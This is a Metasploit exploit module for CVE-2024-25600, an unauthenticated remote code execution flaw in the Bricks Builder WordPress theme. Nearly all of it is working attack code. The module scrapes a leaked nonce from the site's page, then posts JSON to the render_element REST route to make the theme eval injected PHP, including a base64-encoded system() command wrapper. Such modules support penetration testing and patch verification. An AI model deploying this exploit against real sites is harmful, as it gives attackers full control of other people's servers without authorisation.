##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Unauthenticated RCE in Bricks Builder Theme',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability in the
          Bricks Builder Theme versions <= 1.9.6 for WordPress. The vulnerability allows attackers
          to execute arbitrary PHP code by leveraging a nonce leakage to bypass authentication and
          exploit the eval() function usage within the theme. Successful exploitation allows for full
          control of the affected WordPress site. It is recommended to upgrade to version 1.9.6.1 or higher.
        },
        'Author' => [
          'Calvin Alkan', # Vulnerability discovery
          'Valentin Lobstein' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-25600'],
          ['URL', 'https://github.com/Chocapikk/CVE-2024-25600'],
          ['URL', 'https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6'],
          ['WPVDB', 'afea4f8c-4d45-4cc0-8eb7-6fa6748158bd']
        ],
        'DisclosureDate' => '2024-02-19',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Platform' => ['unix', 'linux', 'win', 'php'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'Privileged' => false
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The URI path to WordPress', '/']),
    ])
  end

  def send_payload(nonce, check)
    code_to_add = if check
                    'throw new Exception("END");'
                  elsif payload_instance.arch.include?(ARCH_PHP)
                    payload.encoded
                  else
                    "system(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));"
                  end
    php_code = "<?php #{code_to_add} ?>"

    uri = normalize_uri(target_uri.path, 'index.php')
    payload_data = {
      'postId' => rand(1..10000).to_s,
      'nonce' => nonce,
      'element' => {
        'name' => 'code',
        'settings' => {
          'executeCode' => 'true',
          'code' => php_code
        }
      }
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => uri,
      'ctype' => 'application/json',
      'data' => payload_data,
      'vars_get' => {
        'rest_route' => '/bricks/v1/render_element'
      }
    )

    return nil unless res && res.code == 200

    check ? !res.body.match(/Exception: (.*?)END/).nil? : res.body
  end

  def fetch_nonce
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi('method' => 'GET', 'uri' => uri)
    return nil unless res&.code == 200

    script_tag_match = res.body.match(%r{<script id="bricks-scripts-js-extra"[^>]*>([\s\S]*?)</script>})
    return nil unless script_tag_match

    script_content = script_tag_match[1]
    nonce_match = script_content.match(/"nonce":"([a-f0-9]+)"/)
    nonce_match ? nonce_match[1] : nil
  end

  def exploit
    return unless wordpress_and_online?

    nonce = fetch_nonce or begin
      print_error('Failed to retrieve nonce. Exiting...')
      return
    end

    print_good("Nonce retrieved: #{nonce}")
    send_payload(nonce, false)
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    nonce = fetch_nonce
    return CheckCode::Unknown unless nonce
    return CheckCode::Vulnerable if send_payload(nonce, true)

    CheckCode::Safe
  end
end
